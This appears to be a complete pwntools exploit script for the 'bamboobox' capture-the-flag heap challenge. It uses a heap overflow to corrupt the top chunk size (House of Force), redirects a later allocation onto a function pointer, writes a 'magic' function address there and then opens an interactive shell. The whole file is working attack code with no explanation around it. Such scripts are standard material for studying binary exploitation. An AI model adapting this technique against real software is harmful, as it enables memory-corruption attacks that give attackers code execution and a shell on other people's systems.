# -*- coding:utf-8 -*-
from pwn import *
context(os="linux", arch="amd64",log_level = "debug")

ip =""
if ip:
    p = remote(ip,20004)
else:
    p = process("./bamboobox", aslr=0)

elf = ELF("./bamboobox")

def sl(s):
    p.sendline(s)
def sd(s):
    p.send(s)
def rc(timeout=0):
    if timeout == 0:
        return p.recv()
    else:
        return p.recv(timeout=timeout)
def ru(s, timeout=0):
    if timeout == 0:
        return p.recvuntil(s)
    else:
        return p.recvuntil(s, timeout=timeout)
def getshell():
    p.interactive()


def show():
    ru("Your choice:")
    sd("1")
def add(index,content):
    ru("Your choice:")
    sd("2")
    ru("Please enter the length of item name:")
    sd(str(index))
    ru("Please enter the name of item:")
    sd(content)
def change(index,length,content):
    ru("Your choice:")
    sd("3")
    ru("Please enter the index of item:")
    sd(str(index))
    ru("Please enter the length of item name:")
    sd(str(length))
    ru("Please enter the new name of the item:")
    sd(content)

def delete(index):
    ru("Your choice:")
    sd("4")
    ru("Please enter the index of item:")
    sd(str(index))
def chunk(i):
    return 0x6020c8+i*0x10

magic = 0x400d49
atoi_got = elf.got["atoi"]
#--------------------------------------------------------------------
#方法一
add(0x50,'aaaa')
payload = 'a'*(0x50)+p64(0)+ p64(0xffffffffffffffff)
change(0,len(payload),payload)
# gdb.attach(p)
# pause()
heap_base = -(0x50 + 0x10)-(0x10+0x10)
malloc_offset = heap_base -0x10
add(malloc_offset,'bbbb')
pause()
add(0x10,p64(magic)*2)
#print p.recv()
pause()
ru("Your choice:")
sl("5")
getshell()

